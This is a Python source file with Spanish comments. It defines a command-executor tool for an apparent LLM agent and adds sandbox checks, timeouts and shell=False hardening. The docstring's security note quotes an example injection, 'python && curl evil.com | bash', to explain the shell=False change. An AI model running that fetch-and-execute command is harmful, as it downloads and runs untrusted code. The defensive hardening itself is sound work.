"""CodeExecutorTool — Ejecuta comandos de forma segura con timeout."""
from __future__ import annotations
import os
import shlex
import subprocess
import logging
from typing import Dict, List, Optional
from pathlib import Path

logger = logging.getLogger(__name__)


class CodeExecutorTool:
    """
    Ejecuta comandos del sistema con:
    - Timeout configurable
    - Captura de stdout y stderr
    - Validación de seguridad previa (sandbox)
    - shell=False para prevenir inyección de shell

    SECURITY NOTE: shell=True fue reemplazado por shlex.split() +
    shell=False para evitar que comandos LLM-generados del tipo
    'python && curl evil.com | bash' escapen la whitelist de sandbox.
    El sandbox sigue recibiendo el string original para validación.
    """

    def __init__(self, sandbox=None, timeout: int = 60):
        self.sandbox = sandbox
        self.timeout = timeout

    def run(
        self,
        command: str,
        cwd: Optional[str] = None,
        timeout: Optional[int] = None,
    ) -> Dict[str, object]:
        """
        Ejecuta un comando y retorna {stdout, stderr, returncode, success, blocked}.
        La validación del sandbox recibe el string original.
        La ejecución usa shlex.split() con shell=False.
        """
        # Validar con sandbox (recibe string original para prefix-matching)
        if self.sandbox and not self.sandbox.validate_command(command):
            return {
                "stdout": "",
                "stderr": f"Comando bloqueado por seguridad: {command}",
                "returncode": -1,
                "success": False,
                "blocked": True,
            }

        # Parsear el comando de forma segura (shell=False por defecto)
        try:
            args: List[str] = shlex.split(command)
        except ValueError as e:
            logger.error(f"CodeExecutor: comando mal formado: {e}")
            return {
                "stdout": "",
                "stderr": f"Comando mal formado: {e}",
                "returncode": -1,
                "success": False,
                "blocked": False,
            }

        try:
            result = subprocess.run(
                args,
                shell=False,          # Previene inyección vía shell
                capture_output=True,
                text=True,
                timeout=timeout or self.timeout,
                cwd=cwd or os.getcwd(),
            )
            logger.info(f"Exec: '{command[:60]}' → rc={result.returncode}")
            return {
                "stdout": result.stdout,
                "stderr": result.stderr,
                "returncode": result.returncode,
                "success": result.returncode == 0,
                "blocked": False,
            }
        except subprocess.TimeoutExpired:
            return {
                "stdout": "",
                "stderr": f"Timeout después de {timeout or self.timeout}s",
                "returncode": -1,
                "success": False,
                "blocked": False,
            }
        except FileNotFoundError:
            return {
                "stdout": "",
                "stderr": f"Ejecutable no encontrado: {args[0] if args else command}",
                "returncode": -1,
                "success": False,
                "blocked": False,
            }
        except Exception as e:
            logger.error(f"CodeExecutor error: {e}")
            return {
                "stdout": "",
                "stderr": str(e),
                "returncode": -1,
                "success": False,
                "blocked": False,
            }

    def install_package(self, package: str, manager: str = "pip") -> Dict:
        """Instala un paquete con pip o npm (usa run() seguro)."""
        if manager == "pip":
            return self.run(f"pip install {package} --quiet")
        elif manager == "npm":
            return self.run(f"npm install {package}")
        return {"success": False, "stderr": f"Manager desconocido: {manager}"}
